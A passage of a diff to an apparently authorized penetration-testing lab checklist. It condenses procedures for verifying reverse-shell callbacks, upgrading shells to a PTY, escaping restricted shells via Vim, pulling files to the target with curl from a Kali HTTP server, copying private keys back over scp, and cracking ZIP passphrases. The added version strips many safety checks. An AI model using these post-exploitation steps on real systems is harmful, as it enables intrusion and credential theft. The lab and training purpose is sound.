-asserts target-side success, access, an interactive channel or EXP-02 completion.
-
-If a callback arrives and the reviewed procedure says it returns an interactive
-target shell, use **one** OS-matched check in that channel. Do not type commands
-into an unexplained TCP peer, HTTP response or file-transfer session.
 For an expected Linux shell:
 
 ```bash
@@ -6453,35 +2277,19 @@ id
 uname -s
 ```
 
-For an expected Windows cmd shell:
+For Windows cmd: `hostname; whoami; ver`.
 
-```cmd
-hostname
-whoami
-ver
-```
-
-Match the returned host and identity with the assigned target and the observed
-peer. A command echoed back without target output is not a shell result.
-
-| Result                                                      | Next action                                                                                                                                    |
-| ----------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
-| New attributable interactive session                        | **EXP-03** in that session, not in your Kali shell.                                                                                            |
-| Expected shell callback returns native host/identity output | **EXP-03** for independent attribution before host work. A TCP connection alone did not prove this result.                                     |
-| Callback/connection only, no usable command result          | Record peer/time and protocol. **GAP-ACCESS** for the missing channel/verification method; do not send guessed commands or claim a host shell. |
-| Tool says sent/done/success, but no independent result      | Repeat the same harmless pre-attempt service check once, then use the next two rows. Do not record success.                                    |
-| Service still answers but no verified session               | **NET-05** or EXP-01 for one changed prerequisite supported by output. Do not loop the same attempt.                                           |
-| Service crashes/stops answering                             | **PAUSE-RECOVERY**, perform the recorded restoration/reset before another attempt. A crash is not execution.                                   |
-| Local parser/dependency/runtime error                       | Correct local execution prerequisites at **EXP-01**; no target result is established.                                                          |
-| Unexpected target mutation or cleanup uncertain             | **PAUSE-RECOVERY**, preserve exact changed objects/processes and recovery evidence.                                                            |
-
-End only the listener/process you started, using its reviewed stop method. Verify
-the exact target changes were restored. Keep originals, variants and attempt
-observations as evidence; do not erase failed attempts to tidy the record.
+| Result | Next |
+| --- | --- |
+| New attributable session | **EXP-03** in that session. |
+| Callback with real host/identity | **EXP-03**. |
+| Connection, no command output | **GAP-ACCESS**. |
+| Service still answers, no session | **NET-05** or **EXP-01** with one changed fact. |
+| Service crashed | **PAUSE-RECOVERY**. |
 
 ## EXP-03. Is the session actually on the assigned host with a known identity?
 
-Inside the **new Linux target shell**, run:
+Linux:
 
 ```bash
 hostname
@@ -6490,653 +2298,169 @@ uname -srm
 pwd
 ```
 
-Inside a **new Windows cmd shell**, run:
+Windows: `hostname; whoami; ver`.
 
-```cmd
-hostname
-whoami
-ver
-cd
-```
+| Result | Next |
+| --- | --- |
+| Host and identity match | **LNX-01** / **WIN-01**. |
 
-Inside a **new Windows target PowerShell**, instead run:
-
-```powershell
-hostname
-whoami
-Get-Location
-```
-
-Compare this host/account with the assigned target and the access method's
-connection evidence. If they agree, enter the matching host checklist; WIN-01
-does the full Windows token check. If attribution remains unclear, use the
-additional address/context commands in the later EXP-03 explanation. Do not
-assume a hostname, callback or root-looking prompt proves the assigned host.
-
-| Result                                                          | Next action                                                                                                                                                         |
-| --------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Linux identity and host corroborate assignment/session evidence | **LNX-01**, retain this entry identity and connection provenance.                                                                                                   |
-| Windows identity and host corroborate assignment                | **WIN-01**, preserving its existing token procedure.                                                                                                                |
-| Host/address differs or local Kali identity appears             | **PAUSE-ROUTE**, identify which shell you reached. Do not run host actions on your workbench by mistake.                                                            |
-| Some inventory denied/unavailable                               | Use remaining independent host/connection evidence. If still unattributable, **GAP-ACCESS**; otherwise enter the matching host branch with the limitation recorded. |
-| Container/restricted context suspected                          | **LNX-02**, not a host-root or objective assertion.                                                                                                                 |
-| Session lost                                                    | Return to the specific authorized access method, not automatically to another exploit attempt.                                                                      |
-
-These identity checks create no files or listeners and need no extra shell.
-Keep an attributed session open for host work. When finished, use the original
-access method's exit/connection cleanup and the source step's cleanup; do not close usable
-access just to finish this verification step.
-
-After the existing host/identity/session checks, use **SHELL-01** only when a
-verified Linux socket shell lacks a usable PTY and its actual Kali foreground
-client has local job control. A working SSH/native PTY goes directly to **LNX-01**;
-do not add a nested PTY merely to satisfy a checklist.
-
-When a justified next procedure needs one reviewed non-secret file, **XFER-01**
-transfers it without replacing a target path and verifies its bytes. It does not
-execute the artifact. Sensitive material needs an authenticated encrypted method;
-Windows retains **WIN-14**. Missing route, runtime or attribution goes to
-**PAUSE-COVERAGE** or **PAUSE-ROUTE**, not a blind callback retry.
-
-Cleanup: exit the temporary PTY and confirm the original access channel is still
-attributed. After private adventure evidence custody capture, remove only the transferred file
-whose exact path and hash were recorded. Do not delete a pre-existing target
-file or clean up a resource you did not create; uncertainty goes to
-**PAUSE-RECOVERY**.
+Windows token work continues at [WIN-01](./win-01.md).
+| Wrong host or a Kali prompt | **PAUSE-ROUTE**. |
+| Some checks denied | **GAP-ACCESS** if unattributable. |
+| Container suspected | **LNX-02**. |
 
 # shell_transfer
 
 ## SHELL-01. Can an existing socket shell become a usable target PTY?
 
-Enter only after **EXP-03** attributes this Linux shell to the assigned host and
-identity. SSH/native sessions that already have a working PTY need no upgrade.
-This procedure requires a foreground socket client running under interactive
-**Kali Bash with job control**, plus target Python 3 and Bash. It is not for a
-Windows cmd shell, an HTTP one-command response or an unverified callback.
+Enter after EXP-03, from a foreground socket client with local job control.
 
-First run **inside the target shell**:
-
-```bash
-hostname
-id
-tty
-command -v python3
-test -x /bin/bash && printf 'Bash available\n'
-```
-
-If identity is unchanged and Python/Bash are available, run **on the target**:
+On the target:
 
 ```bash
 python3 -c 'import pty; pty.spawn(["/bin/bash", "--noprofile", "--norc"])'
 tty
 ```
 
-A target `/dev/pts/...` is the PTY observation. This creates another child shell,
-not a new privilege or a second network connection. If it fails, keep the existing
-shell and **PAUSE-COVERAGE** the missing runtime/terminal prerequisite.
-
-Now press **Ctrl-Z once** in the socket terminal. It must return to the **local
-Kali Bash prompt**, suspending the socket client. If it instead suspends something
-on the target or does not return to Kali, stop this sequence; do not run local
-terminal commands blindly. At the verified **local Kali prompt**:
+Press Ctrl-Z once to return to Kali, then:
 
 ```bash
-hostname
-jobs -l
-tty
 stty -g
 stty size
+stty raw -echo && fg '%1'; stty '<SAVED_MODE>'
 ```
 
-Keep that exact tty and saved mode for recovery. Record displayed rows/columns.
-Select the actual suspended socket job from `jobs -l`, not another scan/server.
-Replace the job number below. Run this as **one local Kali command line** so
-terminal restoration runs when that foreground job returns:
+In the target: `export TERM=xterm-256color; stty rows '<ROWS>' cols '<COLS>'`.
 
-```bash
-stty raw -echo && fg '%<actual-suspended-socket-job-number>'; stty '<recorded-local-stty-mode>'
-```
-
-After resume, press Enter if needed. **Inside the target PTY**, use the actual
-local size and a terminal type supported by your emulator:
-
-```bash
-export TERM=xterm-256color
-stty rows '<recorded-local-rows>' cols '<recorded-local-columns>'
-tty
-hostname
-id
-```
-
-| Observation | Next |
+| Result | Next |
 | --- | --- |
-| Same host/identity, target PTY, ordinary line editing and foreground commands work | **LNX-01**. PTY usability is not privilege/objective completion. |
-| Python missing, job control unavailable or local/remote tty confused | Keep the existing channel; **PAUSE-COVERAGE** for a context-specific alternative. Do not repeat raw-mode changes. |
-| Shell/connection dies or job identity is uncertain | Restore local tty, then the original access method's recovery. No automatic exploit retry. |
-| Target identity changed unexpectedly | **EXP-03**, reattribute before host work. |
-
-When finished, leave the added target child shell with `exit`. This may
-return to the original target socket shell rather than close the connection.
-Exit that parent separately when finished, and confirm the owned socket client
-ends. The one-line local command restores the saved mode on return. Check local
-`stty -a` and ordinary visible input. If it is still broken, from **another Kali
-terminal** restore the exact recorded local tty and mode:
-
-```bash
-stty -F '<recorded-local-Kali-tty>' '<recorded-saved-mode>'
-```
-
-No target file was created. Do not kill every Bash/Python process or reset the
-wrong terminal. If the saved mode was lost, `stty sane` on the exact local tty is
-a fallback, not an exact restoration. Keep unresolved process/tty state at
-**PAUSE-RECOVERY**. Workbench mirror/input-mode switching is not shell job control;
-use this only where Ctrl-Z and the verified local prompt actually behave as above.
+| PTY and line editing work | **LNX-01**. |
+| No Python or job control | **PAUSE-COVERAGE**. |
+| Local tty broken | `stty sane` on that tty, then **PAUSE-RECOVERY**. |
 
 ## SHELL-02. Can an available Vim open a usable same-user shell?
 
-Select only for an attributed authorized Linux lab session with a restricted
-command path, a permitted `vi`/`vim` command that is actually Vim, and an
-available `/bin/bash`. This is editor-based usability recovery, not a privilege
-transition. Do not use it to bypass an out-of-scope account restriction.
-At the restricted **target shell**, record its actual flags and allowed command:
-
 ```bash
-printf 'Shell: %s\nFlags: %s\n' "$0" "$-"
-command -v '<observed-allowed-Vim-command-name>'
-'<same-observed-allowed-Vim-command-name>' --version
+command -v vi vim
+vi -N -u NONE -n -i NONE
 ```
 
-Use the permitted basename, such as `vi`, without inventing a full command path
-that the restricted shell forbids. If it is not Vim, this invocation does not
-apply. Open an unnamed buffer without config/plugin, swap or viminfo files:
+In Vim: `:set shell=/bin/bash`, `:shell`. In the child: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; id`.
 
-```bash
-'<same-observed-allowed-Vim-command-name>' -N -u NONE -n -i NONE
-```
-
-**Inside Vim**, press Escape, then enter each line below followed by Enter.
-These are editor commands, not commands to paste at the restricted shell:
-
-```text
-:set shell=/bin/bash
-:!test -x /bin/bash
-:shell
-```
-
-If the executable check fails, skip `:shell` and quit with `:q!`. If Vim reports
-restricted mode, shell disabled, missing terminal or another refusal, preserve
-the exact prerequisite at **PAUSE-COVERAGE**. Do not remove its restriction flag or
-switch to an unreviewed editor to bypass that policy.
-
-At the **new target Bash prompt**, restore only this child shell's command path,
-then verify identity and host:
-
-```bash
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-printf 'Shell: %s\nFlags: %s\n' "$0" "$-"
-hostname
-id
-tty
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Expected host/account, unrestricted child Bash and native commands usable | **LNX-01**, then account-specific **LNX-03**. Editor recovery does not establish sudo rights. |
-| Commands work but host/account attribution is missing or changes | **EXP-03**, not presumed privilege. |
-| Still restricted, Bash missing or editor command denied | **PAUSE-COVERAGE** for the real missing prerequisite. Keep the original attributed access. |
+| Unrestricted Bash and expected identity | **LNX-01**. |
+| Still restricted | **PAUSE-COVERAGE**. |
+| Identity unclear | **EXP-03**. |
 
-Cleanup has two returns. Run `exit` inside the child Bash to return to Vim.
-Then press Escape and enter `:q!` to return to the original restricted shell.
-Run its `printf 'Shell: %s\nFlags: %s\n' "$0" "$-"` again. The child PATH
-change does not alter the parent's environment. No named file was edited.
-Bash may read its normal user startup files or update existing shell history;
-record such effects, preserve prior history and do not erase it. the source step's cleanup
-accounts for other resources; an uncertain return goes to **PAUSE-RECOVERY**.
+Exit the child, then `:q!` in Vim.
 
 ## XFER-01. Can one reviewed local file reach the target without replacement?
 
-Enter with a verified Linux target shell, an authorized route back to the Kali
-lab interface, one reviewed non-secret file and a named task that needs it.
-If the file is an exploit candidate, complete **EXP-01** on the Kali original
-before transfer; the target copy is not the source-review location. This step
-transfers bytes only. It does not run a tool or trust an exploit. Do not expose
-credentials, private keys,
-adventure evidence or an entire home/library directory over this unauthenticated
-plain HTTP service. Use a secure authenticated transfer instead for sensitive
-material. Windows transfer already has the preserved **WIN-14** procedure.
-
-In **a separate Kali Bash terminal**, inspect the exact source and chosen lab
-interface. Choose one fresh staging directory name and repeat it in each step:
+Kali, one shell:
 
 ```bash
-test -f '<absolute-path-to-reviewed-file>' && test -r '<absolute-path-to-reviewed-file>'
-ip -brief address
+cp -- '<FILE>' ./artifact.bin
+sha256sum artifact.bin; wc -c < artifact.bin
+python3 -m http.server '<PORT>' --bind '<KALI_IP>'
 ```
 
-```bash
-mkdir -m 700 -- './one-file-transfer-<unique-run-id>'
-```
+Target:
 
 ```bash
-cp -- '<absolute-path-to-reviewed-file>' './one-file-transfer-<same-run-id>/artifact.bin'
-sha256sum -- '<absolute-path-to-reviewed-file>' './one-file-transfer-<same-run-id>/artifact.bin'
-wc -c < './one-file-transfer-<same-run-id>/artifact.bin'
-ls -la -- './one-file-transfer-<same-run-id>'
-```
-
-Run lines one at a time and stop on any prerequisite/copy failure. Require matching
-source/staged hashes and no extra file/symlink in the served directory. Record the
-staged hash and byte count through your existing verified operator channel. Check
-that the literal bind address belongs to the intended lab interface and the port
-is unused. Start this foreground server in the same **Kali terminal**:
-
-```bash
-python3 -m http.server '<unused-unprivileged-port>' --bind '<owned-Kali-lab-interface-IPv4>' --directory './one-file-transfer-<same-run-id>'
-```
-
-Do not replace the bind address with `0.0.0.0` or the directory with the workspace.
-Keep the server log and connection source correlated. **Inside the verified
-target Bash shell**, check the installed curl version before receiving. Require
-8.4.0 or newer so `--max-filesize` also stops a transfer whose size was not
-announced in advance. Do not silently drop the size bound on older curl:
-
-```bash
-curl --version
-```
-
-Then receive into a new private directory. Replace all values with the
-recorded values:
-
-```bash
-mkdir -m 700 -- '/tmp/owb-transfer-<unique-run-id>'
-```
-
-```bash
-curl --disable --globoff --proto '=http' --noproxy '*' --fail \
-  -sS --connect-timeout 5 \
-  --max-filesize '<recorded-positive-byte-count>' --output '/tmp/owb-transfer-<same-run-id>/artifact.bin' \
-  'http://<same-owned-Kali-lab-interface-IPv4>:<same-listener-port>/artifact.bin'
-printf 'curl exit: %s\n' "$?"
-```
-
-Only if the transfer completed, compare the received size and recorded hash:
-
-```bash
-wc -c < '/tmp/owb-transfer-<same-run-id>/artifact.bin'
-printf '%s  %s\n' '<recorded-staged-SHA256>' '/tmp/owb-transfer-<same-run-id>/artifact.bin' | sha256sum -c -
-```
-
-Stop if directory creation/curl/hash tools are unavailable or values remain
-unresolved. No redirects, proxy, execution bit or command execution is added.
-
-| Observation | Next |
-| --- | --- |
-| Curl succeeds, byte count and independently recorded SHA256 match | Record exact received path/hash and return to the task that justified this transfer. An exploit candidate must already have passed **EXP-01** on Kali; use private adventure evidence if custody matters. Transfer does not authorize execution. |
-| Timeout/HTTP failure/partial file | Delete the exact partial artifact below; **PAUSE-COVERAGE** checks route/server/URL once. Do not execute partial bytes. |
-| HTTP success but hash or byte count differs | Delete the received file; compare immutable source/stage and connection attribution. No execution or blind repeat. |
-| Target client/version or writable destination unavailable | **PAUSE-COVERAGE** for an available authenticated/context-specific method; do not silently remove verification. |
-
-After the transfer, stop the exact foreground Kali server with
-Ctrl-C after transfer, including a failed one. On Kali, confirm the intended
-listener is gone with `ss -ltn 'sport = :<same-listener-port>'`. Another owner's listener
-is not permission to kill it. After any explicitly chosen downstream use and
-custody review, remove the exact received artifact **on the target**:
-
-```bash
-ls -la -- '/tmp/owb-transfer-<same-run-id>'
-rm -i -- '/tmp/owb-transfer-<same-run-id>/artifact.bin'
-rmdir -- '/tmp/owb-transfer-<same-run-id>'
-```
-
-Then remove only the staging copy **on Kali**, preserving the source original:
-
-```bash
-ls -la -- './one-file-transfer-<same-run-id>'
-rm -i -- './one-file-transfer-<same-run-id>/artifact.bin'
-rmdir -- './one-file-transfer-<same-run-id>'
-```
-
-Unknown additional files, deletion failure or a residual owned server stay at
-**PAUSE-RECOVERY**. Do not recursively delete either host's working directory.
-
-## XFER-02. Can one selected sensitive file return to Kali over verified SSH?
-
-**Use when:** a named task such as LPRIV-09 has produced a complete small
-private copy on the assigned Linux target, and an **already verified, permitted
-SSH account** can read that exact file through SFTP. This is a target-to-Kali
-copy, not a new credential guess. Use SSH-01's verified host-key file and the
-existing account's authentication key, not the recovered artifact. This branch
-requires OpenSSH 9.0+ on Kali and key authentication. Password-only access,
-missing SFTP or a callback without permitted SSH read access stays at PAUSE-COVERAGE.
-
-Keep one exact regular file, at most 65536 bytes, and an absolute target path
-without wildcards, `~`, quotes or control characters. Use ordinary path
-characters, letters, digits, `/`, `.`, `_` and `-`. A larger file needs a separate
-chosen budget/method. On the **target**, record size and SHA256 without printing
-the contents. Reuse the producing task's still-current complete-copy evidence.
-
-```bash
-test -f '<absolute-private-target-copy>' && test ! -L '<absolute-private-target-copy>' && stat -c '%F %a %U:%G %s %n' -- '<absolute-private-target-copy>' && sha256sum -- '<absolute-private-target-copy>'
-```
-
-On **Kali**, check the installed SSH client version. Use the same permitted
-account/host/port and known-host file as the verified SSH context. Keep any
-SSH-03 firewall closure on the cleanup list.
-
-```bash
-ssh -V
-```
-
-In a trusted, quiet, operator-owned private working directory, choose a new run
-name and create one absent destination directory. Failure means stop, not reuse
-an old directory. No other process may write into it during this transfer.
-
-```bash
-(umask 077; mkdir -m 0700 -- './received-secret-<run-id>')
-```
-
-After confirming creation, perform **one** transfer. Host mismatch or denied
-authentication stops the attempt. Enter the existing key's passphrase only at
-the local prompt; cancel after a wrong entry. Do not put it in argv/history.
-The explicit `-F /dev/null` excludes SSH config-driven proxies, commands and
-extra identity files. No agent, forwarding, legacy SCP or trust bypass is added.
-
-```bash
-test -d './received-secret-<same-run-id>' && test ! -L './received-secret-<same-run-id>' && test ! -e './received-secret-<same-run-id>/artifact.bin' && test ! -L './received-secret-<same-run-id>/artifact.bin' && (umask 077; scp -F /dev/null -P '<observed-ssh-port>' -i '<existing-authentication-key-on-Kali>' -o 'PreferredAuthentications=publickey' -o 'IdentitiesOnly=yes' -o 'IdentityAgent=none' -o 'ForwardAgent=no' -o 'ClearAllForwardings=yes' -o 'StrictHostKeyChecking=yes' -o 'GlobalKnownHostsFile=/dev/null' -o 'UserKnownHostsFile=<verified-known-hosts-file-on-Kali>' -o 'ConnectTimeout=10' -o 'ConnectionAttempts=1' '<verified-ssh-account>@<assigned-target-ipv4>:<absolute-private-target-copy>' './received-secret-<same-run-id>/artifact.bin'; copy_status=$?; printf 'scp exit: %s\n' "$copy_status"; exit "$copy_status")
-```
-
-Only after exit zero, inspect the **Kali copy**, keep mode 0600, and compare
-against the target's separately recorded size/hash. Do not print key bytes.
-
-```bash
-test -f './received-secret-<same-run-id>/artifact.bin' && test ! -L './received-secret-<same-run-id>/artifact.bin' && chmod 0600 -- './received-secret-<same-run-id>/artifact.bin' && wc -c < './received-secret-<same-run-id>/artifact.bin' && printf '%s  %s\n' '<recorded-target-copy-SHA256>' './received-secret-<same-run-id>/artifact.bin' | sha256sum -c -
+curl --fail -sS -o /tmp/artifact.bin 'http://<KALI_IP>:<PORT>/artifact.bin'
+sha256sum /tmp/artifact.bin
 ```
 
 | Result | Next |
 | --- | --- |
-| Exit zero, exact recorded size/hash and private regular local copy | Return to the named initiating task. ART-01 can fingerprint a key; SSH-01/02 perform any separately permitted key login. Copy success is not credential usability or host privilege. Record sensitive custody privately only if retention is needed. |
-| Changed host key, denied login, SFTP failure, interruption or mismatch | Preserve the error and treat any received bytes as partial/untrusted. Do not use them for authentication or overwrite them by retry. PAUSE-COVERAGE chooses the missing prerequisite or a different evidenced method. |
-| Existing destination, failed directory creation, unexpected link/type or concurrent writer | Do not copy or delete an unknown artifact. Resolve custody first; do not weaken the guards. |
+| Hash matches | Return to the task that needs the file; EXP-01 must already be done. |
+| Partial or mismatch | Delete it, **PAUSE-COVERAGE**. |
+| No client or writable path | **PAUSE-COVERAGE**. |
 
-**Cleanup:** after the chosen use/retention decision, inspect and remove only
-this run's received copy on Kali, including an attributed partial copy after
-failure. Changed ownership/type or an unexpected file stays an unresolved
-custody question. Confirm the exact file before answering the interactive prompt.
+Stop the server with Ctrl-C and delete both copies afterwards.
+
+## XFER-02. Can one selected sensitive file return to Kali over verified SSH?
+
+Target:
 
 ```bash
-ls -la -- './received-secret-<same-run-id>'
-rm -i -- './received-secret-<same-run-id>/artifact.bin'
-rmdir -- './received-secret-<same-run-id>'
+stat -c '%s %n' -- '<FILE>'; sha256sum -- '<FILE>'
 ```
 
-Remove the target staging copy only using the initiating task's recorded
-hash/ownership cleanup after destination custody is resolved. Never delete the
-original protected file or the existing authentication key/known-host file.
-This transfer leaves no listener or ongoing connection. Secure transport does
-not securely erase terminal history, backups or storage media; preserve evidence
-and document sensitive retained copies instead of claiming forensic erasure.
+Kali:
+
+```bash
+scp -P '<SSH_PORT>' -i '<KEY>' -o StrictHostKeyChecking=yes -o 'UserKnownHostsFile=<KNOWN_HOSTS>' '<USER>@<TARGET_IP>:<FILE>' ./artifact.bin
+sha256sum ./artifact.bin
+```
+
+| Result | Next |
+| --- | --- |
+| Size and hash match | Return to the initiating task. |
+| Denied, interrupted or mismatch | **PAUSE-COVERAGE**. |
+
+Keep the local copy at 0600 and delete it after use.
 
 # local_artifact
 
 ## ART-01. Does this exact downloaded file contain a usable next lead?
 
-Enter after FTP-02, SMB-02 or another attributed completed read of **one**
-named file. Use the actual local copy path, not the remote filename or a glob.
-First check the existing file and record its hash:
-
 ```bash
-stat -c '%F %s bytes %a %U:%G %n' -- '<absolute-private-local-copy>'
-sha256sum -- '<absolute-private-local-copy>'
-file -- '<absolute-private-local-copy>'
-wc -c -- '<absolute-private-local-copy>'
+file -- '<COPY>'
+sha256sum -- '<COPY>'
+strings -a -n 6 -- '<COPY>' | head -n 80 | cat -v
 ```
 
-The local copy's `wc -c`, hash and `file` result are the integrity authority.
-A crawler byte count is only a discovery hint; compare an HTTP `Content-Length`
-only when that header actually describes the selected representation.
-
-If `file` identifies JPEG, PNG, BMP or WAV, inspect the same copy from cheap,
-read-only signals toward format-specific tooling:
+Format-specific checks, only when the type justifies them:
 
 ```bash
-exiftool -- '<same-absolute-private-local-copy>'
-strings -a -n 6 -- '<same-absolute-private-local-copy>' | head -n 80 | cat -v
-binwalk -- '<same-absolute-private-local-copy>'
+exiftool -- '<COPY>'
+binwalk -- '<COPY>'
+ssh-keygen -lf '<COPY>' -E sha256
+zipinfo -l '<COPY>' | sed -n '1,80p'
 ```
 
-Use a steganography tool only when format, metadata, strings, binwalk output or
-another recorded clue justifies it. A wrong `steghide` passphrase rejects that
-candidate; it does not prove that no embedded data exists. Try an evidence-backed
-passphrase before considering any finite permitted offline recovery.
-
-```bash
-steghide info '<same-absolute-private-local-copy>'
-mkdir -m 700 -- './artifact-extract-<unique-run-id>'
-steghide extract -sf '<same-absolute-private-local-copy>' -xf './artifact-extract-<same-run-id>/extracted.bin'
-```
-
-Enter the evidenced passphrase only at the prompt so it is not copied into the
-command or Workbench review. Stop after one rejected candidate unless a separate,
-finite offline-recovery decision is explicitly permitted.
-
-Decode one obvious, bounded Base64 or hexadecimal text candidate locally into a
-fresh private directory. Preserve the original bytes and the decoded derivative:
-
-```bash
-umask 077
-mkdir -- './artifact-decode-<unique-run-id>'
-printf '%s' '<bounded-base64-text>' | base64 --decode > './artifact-decode-<same-run-id>/decoded.bin'
-wc -c -- './artifact-decode-<same-run-id>/decoded.bin'
-sha256sum -- './artifact-decode-<same-run-id>/decoded.bin'
-file -- './artifact-decode-<same-run-id>/decoded.bin'
-```
-
-For bounded hexadecimal text, use `xxd -r -p` instead of `base64 --decode`.
-Decoded text or an extracted object is a lead to verify independently, not proof
-that its URL, account, key or passphrase works. Extract only into a fresh private
-directory, then feed the exact extracted object back through ART-01.
-
-Only if `file` identifies a ZIP, list the first 80 visible metadata lines
-without extracting it:
-
-```bash
-(set -o pipefail; LC_ALL=C zipinfo -l '<same-absolute-private-local-copy>' | sed -n '1,80p' | cat -v)
-printf 'Listing exit: %s\n' "$?"
-```
-
-The printed exit belongs to the listing pipeline, including `zipinfo` errors.
-An archive member named `wp-config.php`, a password
-or an SSH key is a *lead*; a filename alone is not proof of usable contents.
-Do not use `unzip -d`, `-p` or an archive GUI here. Unknown member paths,
-links, large uncompressed sizes or encryption require a separately reviewed
-single-member read and protected destination before any extraction.
-
-Only if `file` identifies a private SSH key, fingerprint the **same** copy
-without printing key material:
-
-```bash
-ssh-keygen -lf '<same-absolute-private-local-copy>' -E sha256
-```
-
-An encrypted or unsupported key may not yield a fingerprint here; that does
-not prove it is fake. Never paste private-key bytes into notes, chat, a URL or
-the Workbench source tree. Keep the source identity, remote path, local path,
-hash and any discovered account clue in private adventure data.
-
-| Observed result | Next choice |
+| Result | Next |
 | --- | --- |
-| One relevant clear-text file already identified by `file` | Use the bounded text read in the source FTP-02/SMB-02 task; then follow only the observed service/account lead. |
-| Image/audio metadata, strings or format analysis identifies one bounded encoded or embedded candidate | Decode or extract only that candidate into a fresh private directory, then repeat **ART-01** on the resulting exact object. Verify any named application resource independently. |
-| Steganography candidate rejects the evidenced passphrase | Preserve the tool error and rejected candidate; remain at **ART-01** for another evidenced clue or use **PAUSE-COVERAGE**. Do not record “no embedded data.” |
-| ZIP listing identifies one exact relevant ordinary member | **ART-02** for a bounded local copy. Keep its name, claimed size and encryption status; do not extract the whole archive. |
-| One relevant encrypted ZIP member, no known passphrase | **ART-03** only if offline recovery of this artifact is permitted and one finite wordlist is selected; otherwise **PAUSE-COVERAGE**. |
-| ZIP metadata cannot be read | Keep the archive hash and error; return to the source read task or **PAUSE-COVERAGE**. Do not treat corruption as a password failure. |
-| ZIP lists no relevant member in the inspected extent | Record that extent and return to **NET-05** for another observed lead; do not claim the archive exhaustively reviewed if output was truncated. |
-| Private-key fingerprint obtained | **SSH-01** only with an already observed, in-scope SSH endpoint, an exact account and permission for this login; the fingerprint is not authentication proof. |
-| Key format/permissions denied or fingerprint fails | Record the exact error and path; **PAUSE-COVERAGE**. Do not infer invalid credentials or rewrite the key automatically. |
-| File type, size or source attribution uncertain | private adventure evidence for custody, then the source read task or **PAUSE-COVERAGE**; do not interpret a partial transfer as a complete artifact. |
-
-This decision changes no target or local file. Retain the protected local copy
-under private adventure evidence if needed, or use the source task's exact local-copy cleanup.
-When a derivative is no longer needed, remove only the exact file created by the
-selected branch, then its now-empty private directory:
-
-```bash
-rm -i -- './artifact-decode-<same-run-id>/decoded.bin'
-rmdir -- './artifact-decode-<same-run-id>'
-rm -i -- './artifact-extract-<same-run-id>/extracted.bin'
-rmdir -- './artifact-extract-<same-run-id>'
-```
-
-Do not delete the attributed original or treat local derivative cleanup as target cleanup.
+| Clear text with an account or service | Follow that service task. |
+| Encoded or embedded candidate | Decode into a fresh directory, then **ART-01** on the result. |
+| Relevant ZIP member | **ART-02**. |
+| Encrypted member | **ART-03** if offline recovery is permitted. |
+| Private key | **SSH-01** with an observed endpoint and account. |
+| Wrong steghide passphrase | One other evidenced candidate, then **PAUSE-COVERAGE**. |
+| Unreadable or attributed wrong | **PAUSE-COVERAGE**. |
 
 ## ART-02. What does one selected ZIP member actually contain?
 
-Enter from ART-01 with one exact relevant member in a completed local ZIP.
-Use a protected Kali directory and an ordinary member no larger than 1 MiB.
-The whole archive must be at most 16 MiB with at most 10,000 entries. Larger
-artifacts need a separately selected budget, not an automatic larger read.
-
-Copy the repository's `scripts/read-lab-zip-member.py` to your Kali helper
-directory once, alongside other reviewed checklist helpers. It uses Python's
-standard library and needs no network or app process. Use its **absolute local
-path** below; choose a fresh output name in your private adventure directory:
-
 ```bash
-python3 '<absolute-local-path-to-read-lab-zip-member.py>' --archive '<absolute-private-ZIP-copy>' --member '<exact-listed-relative-member>' --output '<new-absolute-private-member-copy>'
+python3 '<read-lab-zip-member.py>' --archive '<ZIP>' --member '<MEMBER>' --output '<OUT>'
+head -c 8192 -- '<OUT>' | cat -v
 ```
 
-For an encrypted member with **one known permitted passphrase**, run this
-instead in an interactive terminal. Enter the passphrase at the prompt, not
-in the command or shell history. This supports traditional ZIP encryption;
-AES or another unsupported format remains a separate procedure:
+Add `--password-prompt` for a traditional-encrypted member with a known passphrase.
 
-```bash
-python3 '<absolute-local-path-to-read-lab-zip-member.py>' --archive '<absolute-private-ZIP-copy>' --member '<exact-listed-relative-member>' --output '<new-absolute-private-member-copy>' --password-prompt
-```
-
-Only after exit zero and a returned byte count/hash, inspect the new copy:
-
-```bash
-sha256sum -- '<same-absolute-private-member-copy>'
-file -- '<same-absolute-private-member-copy>'
-```
-
-If it is text, read a bounded preview without executing it:
-
-```bash
-head -c 8192 -- '<same-absolute-private-member-copy>' | cat -v
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Config/mail/text identifies an exact account or service | Follow that observed service decision, such as **WEB-09**, **DB-01** or permitted **SSH-01**. The file contents do not prove login. |
-| Copy is a private-key lead | **ART-01** for its fingerprint, then permitted **SSH-01/02**. Do not execute it or mistake an encrypted key for an unencrypted one. |
-| Member absent/duplicated, unsafe path/type, unsupported method or over limit | Keep the exact restriction; **PAUSE-COVERAGE** for another observed lead or **GAP-ACCESS** for the specific unsupported artifact. |
-| Passphrase denied or encryption unsupported | Record the failure without the passphrase; **ART-03** only for permitted traditional ZIP recovery, otherwise **PAUSE-COVERAGE**. AES remains unsupported by this member reader even if another tool recovers a candidate. |
-| Corrupt archive/CRC or inconsistent size | Copy is not confirmed; return to its original read task for custody/transfer verification. |
-| Local output exists or write fails | Choose a new private name after inspecting local storage. An interrupted/failed write may leave a partial file; do not read it as complete. |
-| No useful content in the preview | **NET-05** for another lead, or select a justified later range. An 8192-byte preview does not exhaust a larger file. |
-
-Retain source ZIP/member/local path/hash and relevant content under private adventure evidence.
-If no longer needed, inspect and remove only the chosen local copy, including
-an explicitly identified failed partial copy. Do not delete the source ZIP or
-unrelated adventure files:
-
-```bash
-stat -- '<same-absolute-private-member-copy>'
-rm -i -- '<same-absolute-private-member-copy>'
-```
-
-The helper never writes the archive's path, mode or ownership. It creates only
-the fresh operator-named local output, with mode 0600 on Kali. No target change
-or listener needs cleanup.
+| Account or service clue | The matching service task. |
+| Private key | **ART-01** for the fingerprint. |
+| Unsupported or unsafe member | **PAUSE-COVERAGE** / **GAP-ACCESS**. |
+| Bad passphrase | **ART-03** if recovery is permitted. |
 
 ## ART-03. Can one permitted offline wordlist recover this ZIP member's passphrase?
 
-Enter with one completed, hash-recorded ZIP, one exact relevant encrypted member
-from ART-01, and permission to recover this local artifact. This step covers
-traditional PKZIP encryption with Kali's John Jumbo tools, not AES, SSH keys,
-online logins or all archive formats. Keep ART-02's 16 MiB archive, 10,000-entry
